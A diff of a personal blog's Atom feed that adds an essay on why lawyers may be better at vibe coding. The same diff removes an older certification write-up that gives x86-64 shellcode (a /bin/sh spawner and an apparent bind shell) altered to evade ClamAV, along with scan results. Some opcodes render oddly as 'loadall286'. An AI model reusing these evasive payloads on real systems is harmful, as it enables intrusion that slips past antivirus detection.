@@ -1,5 +1,32 @@
 <?xml version="1.0" encoding="utf-8"?>
-<feed xmlns="http://www.w3.org/2005/Atom"><title>limbenjamin - articles</title><link href="https://limbenjamin.com/" rel="alternate"></link><link href="https://limbenjamin.com/feeds/articles.atom.xml" rel="self"></link><id>https://limbenjamin.com/</id><updated>2026-05-28T21:52:00+08:00</updated><entry><title>Ubuntu's Docker Snap pecularities</title><link href="https://limbenjamin.com/articles/ubuntu-snap-docker.html" rel="alternate"></link><published>2026-05-28T21:52:00+08:00</published><updated>2026-05-28T21:52:00+08:00</updated><author><name>Benjamin Lim</name></author><id>tag:limbenjamin.com,2026-05-28:/articles/ubuntu-snap-docker.html</id><summary type="html">&lt;p&gt;Docker installed using Snap has a pecularity where it is restricted to the user's home directory. The AI models which I used to assist took me round and round convincing me that the file did not exist, or that the version of Docker I was using expected &lt;code&gt;compose.yml&lt;/code&gt; instead …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Docker installed using Snap has a pecularity where it is restricted to the user's home directory. The AI models which I used to assist took me round and round convincing me that the file did not exist, or that the version of Docker I was using expected &lt;code&gt;compose.yml&lt;/code&gt; instead of &lt;code&gt;docker-compose.yml&lt;/code&gt; but this is not so. &lt;/p&gt;
+<feed xmlns="http://www.w3.org/2005/Atom"><title>limbenjamin - articles</title><link href="https://limbenjamin.com/" rel="alternate"></link><link href="https://limbenjamin.com/feeds/articles.atom.xml" rel="self"></link><id>https://limbenjamin.com/</id><updated>2026-06-10T11:36:00+08:00</updated><entry><title>Why Lawyers May Be Better at Vibe Coding</title><link href="https://limbenjamin.com/articles/why-lawyers-may-be-better-at-vibecoding.html" rel="alternate"></link><published>2026-06-10T11:36:00+08:00</published><updated>2026-06-10T11:36:00+08:00</updated><author><name>Benjamin Lim</name></author><id>tag:limbenjamin.com,2026-06-10:/articles/why-lawyers-may-be-better-at-vibecoding.html</id><summary type="html">&lt;p&gt;There is a running joke in software circles that developers hate writing documentation. Ask a developer to build a feature and they will dive headfirst into the code. Ask them to document it afterwards and it will never get done. This is not a character flaw so much as a …&lt;/p&gt;</summary><content type="html">&lt;p&gt;There is a running joke in software circles that developers hate writing documentation. Ask a developer to build a feature and they will dive headfirst into the code. Ask them to document it afterwards and it will never get done. This is not a character flaw so much as a reflection of how IT people are wired — they were drawn to the field because they like solving logical, deterministic problems, not because they enjoy crafting precise prose.&lt;/p&gt;
+&lt;p&gt;With the rise of LLMs and vibe coding tools like Cursor, Claude Code and GitHub Copilot, this matters more than it used to.&lt;/p&gt;
+&lt;h2&gt;Prompting Is a Language Skill&lt;/h2&gt;
+&lt;p&gt;A lot has been written about prompt engineering as though it were some arcane technical discipline requiring knowledge of tokenisation and model internals. In practice, the most important skill is far more mundane: the ability to describe what you want precisely and unambiguously.&lt;/p&gt;
+&lt;p&gt;This is not a skill that most IT curricula develop. Computer science degrees teach algorithms, data structures, discrete mathematics and operating systems. There is little emphasis on written communication. The stereotype of the developer who communicates exclusively in terse Slack messages and Stack Overflow answers exists for a reason.&lt;/p&gt;
+&lt;p&gt;Lawyers, by contrast, spend years being trained to write with precision. Every word in a contract, a pleading or a legal opinion is deliberate. Ambiguity is the enemy. A poorly drafted clause can expose a client to liability or render an entire agreement unenforceable. Law students learn early on that "the court may order costs" and "the court shall order costs" are not interchangeable, even though a layperson might treat them as synonymous. This instinct for precision translates surprisingly well to prompting.&lt;/p&gt;
+&lt;h2&gt;What Good Prompting Actually Looks Like&lt;/h2&gt;
+&lt;p&gt;Consider asking an AI model to build a simple web form that accepts user submissions and sends an email notification. An IT person might write:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Build a contact form that emails me when someone submits it.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;A lawyer might write something closer to:&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Build a contact form with three fields: name (text, required), email (valid email format, required) and message (textarea, required, maximum 500 characters). On submission, validate all fields before submitting for processing. The server should send an email to admin@example.com with the subject "New Contact Form Submission" containing all three field values. Return a message on success, and a response with a specific error message if validation fails.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;The second prompt will produce something usable on the first attempt. The first will produce something that requires three or four rounds of back-and-forth to pin down the missing details.&lt;/p&gt;
+&lt;p&gt;The IT person is not being lazy. They simply filled in the gaps mentally, the way they would when reading a requirements document. The lawyer left nothing to inference, because leaving things to inference is professional malpractice in their field.&lt;/p&gt;
+&lt;h2&gt;The Documentation Paradox&lt;/h2&gt;
+&lt;p&gt;There is a certain irony here. The people who are most resistant to writing documentation are the ones building the tools that require good documentation to use effectively. Developers have spent decades arguing that code should be self-documenting, that clean code is its own explanation. This philosophy is fine when the reader is another developer. It breaks down entirely when the reader is a language model being asked to generate new code from scratch.&lt;/p&gt;
+&lt;p&gt;Vibe coding is, at its core, a documentation exercise. You are writing a specification, and the AI is implementing it. The quality of the output is bounded by the quality of the input. A developer who cannot write a clear specification will get mediocre results and blame the model.&lt;/p&gt;
+&lt;h2&gt;Lawyers Are Already Comfortable With This Workflow&lt;/h2&gt;
+&lt;p&gt;There is another dimension to this. Lawyers are accustomed to working iteratively with a text — drafting, reviewing, redlining and refining. This maps naturally onto the prompt-refine loop that effective AI usage requires. They are also used to specifying not just what they want but what they do not want, which is equally important when prompting. Exclusion clauses in contracts and negative constraints in prompts serve the same function.&lt;/p&gt;
+&lt;p&gt;IT folks, on the other hand, often treat the first output as a near-final draft that needs to be debugged rather than a starting point to be refined through better specification. This is the wrong mental model.&lt;/p&gt;
+&lt;h2&gt;Caveats&lt;/h2&gt;
+&lt;p&gt;This is not to say that lawyers will outperform developers on every AI-assisted task. Debugging, architecture decisions and understanding whether a generated output is actually correct still require technical knowledge. A lawyer who vibe-codes an authentication system without understanding session management or SQL injection is going to produce something that works superficially and fails catastrophically in production.&lt;/p&gt;
+&lt;p&gt;The more realistic picture is that the tasks where lawyers have an edge are the ones that are specification-heavy and relatively self-contained — building internal tools, automating document workflows, generating boilerplate code for well-understood problems. For anything involving non-trivial system design or security considerations, technical knowledge remains essential.&lt;/p&gt;
+&lt;h2&gt;Conclusion&lt;/h2&gt;
+&lt;p&gt;The assumption that software development will always be the exclusive domain of people with technical backgrounds is being tested. Vibe coding has made it possible for non-technical people to build real things, and it turns out that the skills which determine success in this new environment are not the ones we would have predicted five years ago. The ability to write precisely and anticipate ambiguity matters more than knowing what a binary tree is. Lawyers, whatever their other shortcomings, have been training for this their entire careers.&lt;/p&gt;</content><category term="articles"></category><category term="Coding"></category><category term="Legal"></category></entry><entry><title>Ubuntu's Docker Snap pecularities</title><link href="https://limbenjamin.com/articles/ubuntu-snap-docker.html" rel="alternate"></link><published>2026-05-28T21:52:00+08:00</published><updated>2026-05-28T21:52:00+08:00</updated><author><name>Benjamin Lim</name></author><id>tag:limbenjamin.com,2026-05-28:/articles/ubuntu-snap-docker.html</id><summary type="html">&lt;p&gt;Docker installed using Snap has a pecularity where it is restricted to the user's home directory. The AI models which I used to assist took me round and round convincing me that the file did not exist, or that the version of Docker I was using expected &lt;code&gt;compose.yml&lt;/code&gt; instead …&lt;/p&gt;</summary><content type="html">&lt;p&gt;Docker installed using Snap has a pecularity where it is restricted to the user's home directory. The AI models which I used to assist took me round and round convincing me that the file did not exist, or that the version of Docker I was using expected &lt;code&gt;compose.yml&lt;/code&gt; instead of &lt;code&gt;docker-compose.yml&lt;/code&gt; but this is not so. &lt;/p&gt;
 &lt;div class="highlight"&gt;&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;&lt;span class="normal"&gt; 1&lt;/span&gt;
 &lt;span class="normal"&gt; 2&lt;/span&gt;
 &lt;span class="normal"&gt; 3&lt;/span&gt;
@@ -4141,168 +4168,6 @@ Where a corporation commits an offence under this Act, a person —
     &lt;span class="p"&gt;)&lt;/span&gt;
 
 &lt;span class="n"&gt;create_shellcode_function&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;shellcode&lt;/span&gt;&lt;span class="p"&gt;)()&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;
-
-&lt;p&gt;This blog post has (not) been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:&lt;/p&gt;
-&lt;p&gt;Student ID: SLAE64-XXXXX&lt;/p&gt;</content><category term="articles"></category><category term="Security"></category></entry><entry><title>SLAE64 #6 - Polymorphic shellcode</title><link href="https://limbenjamin.com/articles/slae64-6-polymorphic-shellcode.html" rel="alternate"></link><published>2019-05-25T20:05:00+08:00</published><updated>2019-05-25T20:05:00+08:00</updated><author><name>Benjamin Lim</name></author><id>tag:limbenjamin.com,2019-05-25:/articles/slae64-6-polymorphic-shellcode.html</id><summary type="html">&lt;p&gt;I have taken shellcode #603 and #859 from shell-storm and created polymorphic version that passed clamav scan. The original version of both shellcodes were detected by clamav scan due to the presence of the &lt;code&gt;/bin/sh&lt;/code&gt; string. Breaking up the string caused the modified versions of both shellcodes to pass …&lt;/p&gt;</summary><content type="html">&lt;p&gt;I have taken shellcode #603 and #859 from shell-storm and created polymorphic version that passed clamav scan. The original version of both shellcodes were detected by clamav scan due to the presence of the &lt;code&gt;/bin/sh&lt;/code&gt; string. Breaking up the string caused the modified versions of both shellcodes to pass the detection. The offending original instruction has been commented out and the next 3 lines contain the modified instruction.&lt;/p&gt;
-&lt;div class="highlight"&gt;&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;&lt;span class="normal"&gt; 1&lt;/span&gt;
-&lt;span class="normal"&gt; 2&lt;/span&gt;
-&lt;span class="normal"&gt; 3&lt;/span&gt;
-&lt;span class="normal"&gt; 4&lt;/span&gt;
-&lt;span class="normal"&gt; 5&lt;/span&gt;
-&lt;span class="normal"&gt; 6&lt;/span&gt;
-&lt;span class="normal"&gt; 7&lt;/span&gt;
-&lt;span class="normal"&gt; 8&lt;/span&gt;
-&lt;span class="normal"&gt; 9&lt;/span&gt;
-&lt;span class="normal"&gt;10&lt;/span&gt;
-&lt;span class="normal"&gt;11&lt;/span&gt;
-&lt;span class="normal"&gt;12&lt;/span&gt;
-&lt;span class="normal"&gt;13&lt;/span&gt;
-&lt;span class="normal"&gt;14&lt;/span&gt;
-&lt;span class="normal"&gt;15&lt;/span&gt;
-&lt;span class="normal"&gt;16&lt;/span&gt;
-&lt;span class="normal"&gt;17&lt;/span&gt;
-&lt;span class="normal"&gt;18&lt;/span&gt;
-&lt;span class="normal"&gt;19&lt;/span&gt;
-&lt;span class="normal"&gt;20&lt;/span&gt;
-&lt;span class="normal"&gt;21&lt;/span&gt;
-&lt;span class="normal"&gt;22&lt;/span&gt;
-&lt;span class="normal"&gt;23&lt;/span&gt;
-&lt;span class="normal"&gt;24&lt;/span&gt;
-&lt;span class="normal"&gt;25&lt;/span&gt;
-&lt;span class="normal"&gt;26&lt;/span&gt;
-&lt;span class="normal"&gt;27&lt;/span&gt;
-&lt;span class="normal"&gt;28&lt;/span&gt;
-&lt;span class="normal"&gt;29&lt;/span&gt;
-&lt;span class="normal"&gt;30&lt;/span&gt;
-&lt;span class="normal"&gt;31&lt;/span&gt;
-&lt;span class="normal"&gt;32&lt;/span&gt;
-&lt;span class="normal"&gt;33&lt;/span&gt;
-&lt;span class="normal"&gt;34&lt;/span&gt;
-&lt;span class="normal"&gt;35&lt;/span&gt;
-&lt;span class="normal"&gt;36&lt;/span&gt;
-&lt;span class="normal"&gt;37&lt;/span&gt;
-&lt;span class="normal"&gt;38&lt;/span&gt;
-&lt;span class="normal"&gt;39&lt;/span&gt;
-&lt;span class="normal"&gt;40&lt;/span&gt;
-&lt;span class="normal"&gt;41&lt;/span&gt;
-&lt;span class="normal"&gt;42&lt;/span&gt;
-&lt;span class="normal"&gt;43&lt;/span&gt;
-&lt;span class="normal"&gt;44&lt;/span&gt;
-&lt;span class="normal"&gt;45&lt;/span&gt;
-&lt;span class="normal"&gt;46&lt;/span&gt;
-&lt;span class="normal"&gt;47&lt;/span&gt;
-&lt;span class="normal"&gt;48&lt;/span&gt;
-&lt;span class="normal"&gt;49&lt;/span&gt;
-&lt;span class="normal"&gt;50&lt;/span&gt;
-&lt;span class="normal"&gt;51&lt;/span&gt;
-&lt;span class="normal"&gt;52&lt;/span&gt;
-&lt;span class="normal"&gt;53&lt;/span&gt;
-&lt;span class="normal"&gt;54&lt;/span&gt;
-&lt;span class="normal"&gt;55&lt;/span&gt;
-&lt;span class="normal"&gt;56&lt;/span&gt;
-&lt;span class="normal"&gt;57&lt;/span&gt;
-&lt;span class="normal"&gt;58&lt;/span&gt;
-&lt;span class="normal"&gt;59&lt;/span&gt;
-&lt;span class="normal"&gt;60&lt;/span&gt;
-&lt;span class="normal"&gt;61&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;&lt;span class="c1"&gt;#603&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;section&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;.text&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="k"&gt;global&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;_start&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nl"&gt;_start:&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="nb"&gt;rdx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rdx&lt;/span&gt;
-
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="c1"&gt;;mov     qword rbx, &amp;#39;//bin/sh&amp;#39;&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="nb"&gt;rbx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;#39;n/sh&amp;#39;&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;shl&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="nb"&gt;rbx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="nb"&gt;rbx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="s"&gt;&amp;#39;//bi&amp;#39;&lt;/span&gt;
-
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;shr&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="nb"&gt;rbx&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x8&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nb"&gt;rbx&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="nb"&gt;rdi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rsp&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nb"&gt;rax&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nb"&gt;rdi&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="nb"&gt;rsi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rsp&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt;     &lt;/span&gt;&lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x3b&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;syscall&lt;/span&gt;
-
-&lt;span class="c1"&gt;#859&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="k"&gt;section&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;.text&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="k"&gt;global&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;_start&lt;/span&gt;
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nl"&gt;_start:&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rsi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nb"&gt;rsi&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;mul&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rsi&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;inc&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;esi&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="mh"&gt;0x2&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;pop&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rdi&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;0x29&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;loadall286&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rdx&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;pop&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rsi&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rax&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;pop&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rdi&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;0x32&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;loadall286&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;0x2b&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;loadall286&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rdi&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;pop&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rsi&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;xchg&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rax&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="nb"&gt;rdi&lt;/span&gt;
-
-&lt;span class="w"&gt;    &lt;/span&gt;&lt;span class="nl"&gt;dup2:&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;dec&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;esi&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;0x21&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;loadall286&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;jnz&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nv"&gt;dup2&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rdx&lt;/span&gt;
-
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="c1"&gt;;mov rdi,0x68732f6e69622f2f&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rdi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x68732f6e&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;shl&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rdi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mi"&gt;32&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;xor&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rdi&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="mh"&gt;0x69622f2f&lt;/span&gt;
-
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rdi&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;push&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rsp&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;pop&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;rdi&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;mov&lt;/span&gt;&lt;span class="w"&gt; &lt;/span&gt;&lt;span class="nb"&gt;al&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="mh"&gt;0x3b&lt;/span&gt;
-&lt;span class="w"&gt;            &lt;/span&gt;&lt;span class="nf"&gt;loadall286&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;
-
-&lt;div class="highlight"&gt;&lt;table class="highlighttable"&gt;&lt;tr&gt;&lt;td class="linenos"&gt;&lt;div class="linenodiv"&gt;&lt;pre&gt;&lt;span class="normal"&gt; 1&lt;/span&gt;
-&lt;span class="normal"&gt; 2&lt;/span&gt;
-&lt;span class="normal"&gt; 3&lt;/span&gt;
-&lt;span class="normal"&gt; 4&lt;/span&gt;
-&lt;span class="normal"&gt; 5&lt;/span&gt;
-&lt;span class="normal"&gt; 6&lt;/span&gt;
-&lt;span class="normal"&gt; 7&lt;/span&gt;
-&lt;span class="normal"&gt; 8&lt;/span&gt;
-&lt;span class="normal"&gt; 9&lt;/span&gt;
-&lt;span class="normal"&gt;10&lt;/span&gt;
-&lt;span class="normal"&gt;11&lt;/span&gt;
-&lt;span class="normal"&gt;12&lt;/span&gt;
-&lt;span class="normal"&gt;13&lt;/span&gt;
-&lt;span class="normal"&gt;14&lt;/span&gt;
-&lt;span class="normal"&gt;15&lt;/span&gt;
-&lt;span class="normal"&gt;16&lt;/span&gt;
-&lt;span class="normal"&gt;17&lt;/span&gt;
-&lt;span class="normal"&gt;18&lt;/span&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;td class="code"&gt;&lt;div&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;Scanning shell_storm_603
-shell_storm_603: Unix.Tool.13691-1 FOUND
-Scanning shell_storm_603_mod
-shell_storm_603_mod: OK
-Scanning shell_storm_859
-shell_storm_859: Unix.Trojan.MSShellcode-95 FOUND
-Scanning shell_storm_859_mod
-shell_storm_859_mod: OK
-
------------ SCAN SUMMARY -----------
-Known viruses: 6137425
-Engine version: 0.100.3
-Scanned directories: 0
-Scanned files: 4
-Infected files: 2
-Data scanned: 0.03 MB
-Data read: 0.03 MB (ratio 1.00:1)
-Time: 26.258 sec (0 m 26 s)
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/div&gt;
 
 &lt;p&gt;This blog post has (not) been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:&lt;/p&gt;
